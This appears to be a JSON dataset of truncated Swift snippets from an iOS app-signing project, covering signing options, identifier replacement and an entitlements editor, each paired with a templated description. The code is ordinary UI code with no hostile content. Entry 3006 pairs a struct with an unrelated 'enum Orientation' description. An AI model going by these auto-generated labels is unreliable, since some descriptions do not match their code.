    "nl": "class SigningDataWrapper - implements functionality related to signing data wrapper",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningData/SigningDataWrapper.swift",
    "code_type": "class"
  },
  {
    "id": "3006",
    "code": "struct MainSigningOptions {\nvar name: String?\nvar version: String?\nvar bundleId: String?\nvar iconURL: UIImage?\n\nvar uuid: String?\nvar removeInjectPaths: [String] = []\n\nlet forceMinimumVersionString = [\"Automatic\", \"15.0\", \"14.0\", \"13.0\"]",
    "nl": "enum Orientation { .top .bottom .left .right }",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningData/SigningOptions.swift",
    "code_type": "struct"
  },
  {
    "id": "3007",
    "code": "struct SigningOptions: Codable {\nvar ppqCheckProtection: Bool = false\nvar dynamicProtection: Bool = false\nvar installAfterSigned: Bool = false\nvar immediatelyInstallFromSource: Bool = false\n\nvar bundleIdConfig: [String: String] = [:]\nvar displayNameConfig: [String: String] = [:]\nvar toInject: [String] = []\n",
    "nl": "struct SigningOptions - implements functionality related to signing options",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningData/SigningOptions.swift",
    "code_type": "struct"
  },
  {
    "id": "3008",
    "code": "extension UserDefaults {\nstatic let signingDataKey = \"defaultSigningData\"\n\nstatic let defaultSigningData = SigningOptions()\n\nvar signingOptions: SigningOptions {",
    "nl": "extension UserDefaults - implements functionality related to user defaults",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningData/SigningOptions.swift",
    "code_type": "extension"
  },
  {
    "id": "3009",
    "code": "func resetSigningOptions() {\nsigningOptions = UserDefaults.defaultSigningData\n}\n}\n",
    "nl": "Function resetSigningOptions - implements resetsigningoptions functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningData/SigningOptions.swift",
    "code_type": "function"
  },
  {
    "id": "3010",
    "code": "struct TogglesOption {\nlet title: String\nlet footer: String?\nvar binding: Bool\n}\n\nfunc toggleOptions(signingDataWrapper: SigningDataWrapper) -> [TogglesOption] {",
    "nl": "struct TogglesOption - implements functionality related to toggles option",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "struct"
  },
  {
    "id": "3011",
    "code": "func toggleOptions(signingDataWrapper: SigningDataWrapper) -> [TogglesOption] {\nreturn [\nTogglesOption(\ntitle: String.localized(\"APP_SIGNING_INPUT_VIEW_CONTROLLER_REMOVE_PLUGINS\"),\nfooter: String.localized(\"APP_SIGNING_INPUT_VIEW_CONTROLLER_REMOVE_PLUGINS_DESCRIPTION\"),\nbinding: signingDataWrapper.signingOptions.removePlugins\n),\nTogglesOption(\ntitle: String.localized(\"APP_SIGNING_INPUT_VIEW_CONTROLLER_REMOVE_ALLOW_BROWSING_DOCUMENTS\"),\nfooter: String.localized(\"APP_SIGNING_INPUT_VIEW_CONTROLLER_REMOVE_ALLOW_BROWSING_DOCUMENTS_DESCRIPTION\"),",
    "nl": "Function toggleOptions - implements toggleoptions functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3012",
    "code": "class SigningsOptionViewController: UITableViewController {\nprivate var application: NSManagedObject?\nprivate var appsViewController: LibraryViewController?\nvar signingDataWrapper: SigningDataWrapper\n\nprivate var toggleOptions: [TogglesOption]\n\ninit(\nsigningDataWrapper: SigningDataWrapper,\napplication: NSManagedObject? = nil,",
    "nl": "class SigningsOptionViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3013",
    "code": "@objc func save() {\nsaveOptions()\n}\n\nfunc saveOptions() {",
    "nl": "Function save - implements save functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3014",
    "code": "func saveOptions() {\nUserDefaults.standard.signingOptions = signingDataWrapper.signingOptions\n}\n\n@available(*, unavailable)\nrequired init?(coder _: NSCoder) {",
    "nl": "Function saveOptions - implements saveoptions functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3015",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupViews()\nsetupNavigation()\n}\n\nfileprivate func setupViews() {",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3016",
    "code": "fileprivate func setupViews() {\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"cell\")\n}\n\nfileprivate func setupNavigation() {",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3017",
    "code": "fileprivate func setupNavigation() {\nnavigationItem.largeTitleDisplayMode = .never\ntitle = String.localized(\"APP_SIGNING_VIEW_CONTROLLER_CELL_SIGNING_OPTIONS_TITLE\")\n}\n\n@objc func toggleOptionsSwitches(_ sender: UISwitch) {",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3018",
    "code": "@objc func toggleOptionsSwitches(_ sender: UISwitch) {\nDebug.shared.log(message: \"Toggle switch tag: \\(sender.tag)\")\n\nswitch sender.tag {",
    "nl": "Function toggleOptionsSwitches - implements toggleoptionsswitches functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3019",
    "code": "extension SigningsOptionViewController {\noverride func numberOfSections(in _: UITableView) -> Int {",
    "nl": "extension SigningsOptionViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3020",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\nreturn 2 + toggleOptions.count\n}\n\noverride func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3021",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nswitch section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3022",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = tableView\n.dequeueReusableCell(withIdentifier: \"cell\") ?? UITableViewCell(style: .default, reuseIdentifier: \"cell\")\ncell.textLabel?.textColor = .label\ncell.accessoryView = nil\n\nDebug.shared.log(message: \"Setting up cell at section: \\(indexPath.section), row: \\(indexPath.row)\")\n\nswitch [indexPath.section, indexPath.row] {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3023",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\n\nswitch [indexPath.section, indexPath.row] {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3024",
    "code": "override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {\nif section == 1 {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3025",
    "code": "extension SigningsOptionViewController {\nfunc showChangeIdentifierAlert() {",
    "nl": "extension SigningsOptionViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3026",
    "code": "func showChangeIdentifierAlert() {\nlet alert = UIAlertController(\ntitle: String.localized(\"SETTINGS_VIEW_CONTROLLER_CELL_CHANGE_IDENTIFIER\"),\nmessage: nil,\npreferredStyle: .alert\n)\n\nalert.addTextField { textField in",
    "nl": "Function showChangeIdentifierAlert - implements showchangeidentifieralert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3027",
    "code": "class AddIdentifierViewController: UITableViewController {\nvar onAdd: ((String, String) -> Void)?\n\nprivate let identifierTextField: UITextField = {",
    "nl": "class AddIdentifierViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3028",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\ntitle = String.localized(\"APP_SIGNING_VIEW_CONTROLLER_CELL_SIGNING_OPTIONS_IDENTIFIERS_NEW\")\nview.backgroundColor = .systemBackground\n\nidentifierTextField.addTarget(self, action: #selector(textFieldsDidChange), for: .editingChanged)\nreplacementTextField.addTarget(self, action: #selector(textFieldsDidChange), for: .editingChanged)\n\nnavigationItem.rightBarButtonItem = UIBarButtonItem(\ntitle: String.localized(\"ADD\"),",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3029",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\nreturn 1\n}\n\noverride func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3030",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nreturn 2\n}\n\noverride func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3031",
    "code": "override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = UITableViewCell(style: .default, reuseIdentifier: nil)\ncell.selectionStyle = .none\n\nswitch indexPath.row {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3032",
    "code": "@objc private func textFieldsDidChange() {\nlet identifierText = identifierTextField.text ?? \"\"\nlet replacementText = replacementTextField.text ?? \"\"\nnavigationItem.rightBarButtonItem?.isEnabled = !identifierText.isEmpty && !replacementText.isEmpty\n}\n\n@objc private func addButtonTapped() {",
    "nl": "Function textFieldsDidChange - implements textfieldsdidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3033",
    "code": "@objc private func addButtonTapped() {\nif let identifier = identifierTextField.text,\nlet replacement = replacementTextField.text,\n!identifier.isEmpty, !replacement.isEmpty\n{",
    "nl": "Function addButtonTapped - implements addbuttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3034",
    "code": "enum IdentifierMode {\ncase bundleId\ncase displayName\n}\n\nclass IdentifiersViewController: UITableViewController {",
    "nl": "enum IdentifierMode - implements functionality related to identifier mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "3035",
    "code": "class IdentifiersViewController: UITableViewController {\nvar signingDataWrapper: SigningDataWrapper\nprivate var mode: IdentifierMode\n\ninit(signingDataWrapper: SigningDataWrapper, mode: IdentifierMode) {",
    "nl": "class IdentifiersViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3036",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\nnavigationItem.rightBarButtonItem = UIBarButtonItem(\nbarButtonSystemItem: .add,\ntarget: self,\naction: #selector(addIdentifierTapped)\n)\n\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"IdentifierCell\")",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3037",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\nswitch mode {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3038",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nreturn 1\n}\n\noverride func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3039",
    "code": "override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {\nswitch mode {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3040",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = tableView.dequeueReusableCell(withIdentifier: \"IdentifierCell\", for: indexPath)\n\nswitch mode {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3041",
    "code": "override func tableView(_: UITableView,\ntrailingSwipeActionsConfigurationForRowAt indexPath: IndexPath)\n-> UISwipeActionsConfiguration?\n{",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3042",
    "code": "private func deleteIdentifier(at index: Int) {\nswitch mode {",
    "nl": "Function deleteIdentifier - deletes identifier",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3043",
    "code": "@objc private func addIdentifierTapped() {\nlet addVC = AddIdentifierViewController(mode: mode)\naddVC.onAdd = { [weak self] identifier, replacement in",
    "nl": "Function addIdentifierTapped - implements addidentifiertapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3044",
    "code": "class EntitlementsEditorViewController: FRSITableViewController {\n// MARK: - Properties\n\n/// User's custom entitlements\nprivate var entitlements: [Entitlement] = [] {",
    "nl": "/ View controller for editing custom entitlements during app signing",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3045",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\n// Load entitlements from signing options\nloadEntitlementsFromSigningOptions()\n\n// Configure UI\nconfigureNavigationBar()\nconfigureTableView()\n",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3046",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Ensure navigation bar is visible and properly styled\nnavigationController?.setNavigationBarHidden(false, animated: animated)\nnavigationController?.navigationBar.prefersLargeTitles = false\n\n// Apply LED effects\napplyLEDEffectsToTableView()\n}",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3047",
    "code": "private func configureNavigationBar() {\ntitle = \"Custom Entitlements\"\n\n// Add buttons\naddButton = UIBarButtonItem(\nimage: UIImage(systemName: \"plus.circle.fill\"),\nstyle: .plain,\ntarget: self,\naction: #selector(addEntitlementTapped)\n)",
    "nl": "MARK: - UI Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3048",
    "code": "private func configureTableView() {\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"EntitlementCell\")\ntableView.separatorStyle = .singleLine\ntableView.backgroundColor = .systemBackground\ntableView.rowHeight = UITableView.automaticDimension\ntableView.estimatedRowHeight = 70\n\n// Empty state message\nupdateEmptyStateIfNeeded()\n}",
    "nl": "Function configureTableView - implements configuretableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3049",
    "code": "private func applyLEDEffectsToTableView() {\n// Add subtle LED glow to section headers\nfor section in 0 ..< tableView.numberOfSections {",
    "nl": "Function applyLEDEffectsToTableView - implements applyledeffectstotableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3050",
    "code": "private func applyLEDEffectsToSearchBar() {\n// Find the search bar's text field\nif let textField = searchController.searchBar.value(forKey: \"searchField\") as? UITextField {",
    "nl": "Function applyLEDEffectsToSearchBar - implements applyledeffectstosearchbar functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3051",
    "code": "private func applyCellLEDEffect(_ cell: UITableViewCell, animated: Bool) {\n// Add a subtle LED effect to the cell\ncell.contentView.addLEDEffect(\ncolor: UIColor.systemBlue,\nintensity: 0.2,\nspread: 8,\nanimated: animated,\nanimationDuration: 3.0\n)\n}",
    "nl": "Function applyCellLEDEffect - implements applycellledeffect functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3052",
    "code": "private func updateEmptyStateIfNeeded() {\nlet displayedEntitlements = isSearching ? filteredEntitlements : entitlements\n\n// Get or create empty state label\nlet emptyStateTag = 1001\nlet emptyLabel: UILabel\n\nif let existing = tableView.viewWithTag(emptyStateTag) as? UILabel {",
    "nl": "Function updateEmptyStateIfNeeded - updates emptystateifneeded",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3053",
    "code": "@objc private func addEntitlementTapped() {\nshowEntitlementEditor()\n}\n\n@objc private func quickAddTapped() {",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3054",
    "code": "@objc private func quickAddTapped() {\n// Create action sheet with common entitlements\nlet alertController = UIAlertController(\ntitle: \"Add Common Entitlement\",\nmessage: \"Select an entitlement to add\",\npreferredStyle: .actionSheet\n)\n\n// Add actions for common entitlements\nfor entitlement in CommonEntitlements.all {",
    "nl": "Function quickAddTapped - implements quickaddtapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3055",
    "code": "private func showEntitlementEditor(preset: Entitlement? = nil, editingIndex: Int? = nil) {\nlet alertController = UIAlertController(\ntitle: editingIndex != nil ? \"Edit Entitlement\" : \"Add Entitlement\",\nmessage: nil,\npreferredStyle: .alert\n)\n\n// Add text fields\nalertController.addTextField { textField in",
    "nl": "Function showEntitlementEditor - implements showentitlementeditor functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3056",
    "code": "private func loadEntitlementsFromSigningOptions() {\n// Get entitlements dictionary from signing options\nif let entitlementsDict = signingDataWrapper.signingOptions.customEntitlements {",
    "nl": "MARK: - Data Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3057",
    "code": "private func saveEntitlementsToSigningOptions() {\n// Convert array of Entitlement objects to dictionary\nvar entitlementsDict: [String: Any] = [:]\nfor entitlement in entitlements {",
    "nl": "Function saveEntitlementsToSigningOptions - implements saveentitlementstosigningoptions functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3058",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\nreturn 1\n}\n\noverride func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {",
    "nl": "MARK: - UITableViewDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3059",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nlet count = isSearching ? filteredEntitlements.count : entitlements.count\nupdateEmptyStateIfNeeded()\nreturn count\n}\n\noverride func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3060",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = tableView.dequeueReusableCell(withIdentifier: \"EntitlementCell\", for: indexPath)\nlet displayedEntitlements = isSearching ? filteredEntitlements : entitlements\n\nif let entitlement = displayedEntitlements[safe: indexPath.row] {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3061",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\nshowEntitlementEditor(editingIndex: indexPath.row)\n}\n\noverride func tableView(_ tableView: UITableView,\ntrailingSwipeActionsConfigurationForRowAt indexPath: IndexPath)\n-> UISwipeActionsConfiguration?\n{",
    "nl": "MARK: - UITableViewDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3062",
    "code": "override func tableView(_ tableView: UITableView,\ntrailingSwipeActionsConfigurationForRowAt indexPath: IndexPath)\n-> UISwipeActionsConfiguration?\n{",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3063",
    "code": "override func tableView(_: UITableView, viewForHeaderInSection _: Int) -> UIView? {\nlet headerView = UIView()\nheaderView.backgroundColor = .clear\n\nlet label = UILabel()\nlabel.text = \"Custom Entitlements\"\nlabel.font = .systemFont(ofSize: 18, weight: .medium)\nlabel.textColor = .label\nlabel.translatesAutoresizingMaskIntoConstraints = false\n",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3064",
    "code": "override func tableView(_: UITableView, heightForHeaderInSection _: Int) -> CGFloat {\nreturn 44\n}\n}\n\n// MARK: - UISearchResultsUpdating\n\nextension EntitlementsEditorViewController: UISearchResultsUpdating {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3065",
    "code": "extension EntitlementsEditorViewController: UISearchResultsUpdating {\nfunc updateSearchResults(for searchController: UISearchController) {",
    "nl": "MARK: - UISearchResultsUpdating",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3066",
    "code": "func updateSearchResults(for searchController: UISearchController) {\nfilterEntitlements(with: searchController.searchBar.text ?? \"\")\n}\n\nprivate func filterEntitlements(with searchText: String) {",
    "nl": "Function updateSearchResults - updates searchresults",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
